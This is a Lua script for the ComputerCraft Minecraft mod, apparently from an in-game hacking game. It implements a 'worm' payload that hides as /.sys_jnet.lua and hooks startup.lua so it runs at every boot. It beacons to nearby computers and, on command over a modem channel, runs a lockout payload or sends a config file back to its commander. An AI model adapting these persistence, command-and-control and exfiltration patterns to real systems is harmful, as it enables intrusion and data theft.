-- worm.lua — Payload
-- Self-spreading agent. Installs as /.sys_jnet.lua.
-- Hooks startup.lua. Probes adjacent computers on same network.
-- Spread requires attacker authorization (mini-puzzle via worm_commander).

-- Install self
local SELF_PATH = "/.sys_jnet.lua"
local HOOK_LINE = 'if fs.exists("/.sys_jnet.lua") then dofile("/.sys_jnet.lua") end'

-- Ensure startup hook
if fs.exists("/startup.lua") then
    local f = fs.open("/startup.lua", "r")
    local content = f.readAll(); f.close()
    if not content:find("sys_jnet") then
        local f2 = fs.open("/startup.lua", "w")
        f2.write(HOOK_LINE .. "\n" .. content)
        f2.close()
    end
else
    local f = fs.open("/startup.lua", "w")
    f.write(HOOK_LINE)
    f.close()
end

-- Background operation
local COMMANDER_CHANNEL = 7777
local WORM_CHANNEL = 7778

local function probe()
    local modem = peripheral.find("modem")
    if not modem then return end
    if not modem.isOpen(WORM_CHANNEL) then modem.open(WORM_CHANNEL) end
    -- Send probe on worm channel
    modem.transmit(WORM_CHANNEL, WORM_CHANNEL, {
        type = "worm_probe",
        from = os.getComputerID(),
        label = os.getComputerLabel() or "",
    })
end

-- Periodic probe (runs in background via parallel)
local function wormLoop()
    while true do
        sleep(30 + math.random(30))
        probe()
    end
end

-- Listen for commands
local function listenLoop()
    local modem = peripheral.find("modem")
    if not modem then return end
    if not modem.isOpen(COMMANDER_CHANNEL) then modem.open(COMMANDER_CHANNEL) end
    while true do
        local ev, side, ch, rch, msg = os.pullEventRaw("modem_message")
        if ch == COMMANDER_CHANNEL and type(msg) == "table" then
            if msg.type == "worm_lockout" then
                -- Run lockout payload
                if fs.exists("/payloads/lockout.lua") then
                    shell.run("/payloads/lockout.lua", msg.name or "", msg.motto or "")
                end
            elseif msg.type == "worm_exfiltrate" then
                -- Send config data back
                local data = {}
                if fs.exists("/.jnet_config") then
                    local f = fs.open("/.jnet_config", "r"); data.config = f.readAll(); f.close()
                end
                modem.transmit(COMMANDER_CHANNEL, COMMANDER_CHANNEL, {
                    type = "worm_data", from = os.getComputerID(), data = data,
                })
            end
        end
    end
end

-- Run both in parallel (non-blocking)
parallel.waitForAny(wormLoop, listenLoop)
